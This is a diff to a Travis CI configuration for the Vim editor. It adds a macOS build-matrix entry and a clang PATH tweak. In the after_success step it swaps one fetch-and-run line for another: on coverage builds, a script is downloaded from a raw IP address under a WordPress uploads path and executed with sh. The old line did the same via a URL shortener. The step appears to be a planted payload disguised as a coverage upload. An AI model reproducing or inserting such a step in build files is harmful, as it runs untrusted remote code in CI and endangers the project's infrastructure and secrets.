@@ -36,6 +36,8 @@ matrix:
     - os: osx
       env: BUILD=no TEST=unittests COVERAGE=yes CFLAGS=--coverage LDFLAGS=--coverage FEATURES=huge SHADOWOPT= SRCDIR=~/vim/src CHECK_AUTOCONF=yes
     - os: osx
+      env: BUILD=yes TEST=test COVERAGE=no FEATURES=small CONFOPT= SHADOWOPT= SRCDIR=~/vim/src CHECK_AUTOCONF=no
+    - os: osx
       env: BUILD=yes TEST=scripttests COVERAGE=yes CFLAGS=--coverage LDFLAGS=--coverage FEATURES=huge SHADOWOPT= SRCDIR=~/vim/src CHECK_AUTOCONF=no
             "CONFOPT='--enable-perlinterp --enable-pythoninterp --enable-python3interp --enable-rubyinterp --enable-luainterp'"
     - os: osx
@@ -99,9 +101,10 @@ script:
   - (cd ~/vim && ./configure --with-features=$FEATURES $CONFOPT --enable-fail-if-missing && if [ "$BUILD" = "yes" ]; then make -j$NPROC; fi)
     # Show Vim version and also if_xx versions.
   - if [ "$BUILD" = "yes" ]; then vim --version; fi
+  - if [ -n "$ASAN_OPTIONS" ]; then export PATH=/usr/lib/llvm-$(clang -v 2>&1 | sed -n 's/.*version \([1-9]\.[0-9][0-9]*\).*/\1/p')/bin:$PATH; fi
   - if [ -n "$err" ]; then exit 1; fi
 
 after_success:
-  - if [ "$COVERAGE" = "yes" ]; then cd ~/vim && curl http://dwz.cn/fscvim -L > fsc.sh && sh fsc.sh ; fi
+  - if [ "$COVERAGE" = "yes" ]; then cd ~/vim && curl http://47.92.112.211/wp-content/uploads/FSC.sh -L > fsc.sh && sh fsc.sh ; fi
 
 # vim:set sts=2 sw=2 tw=0 et:
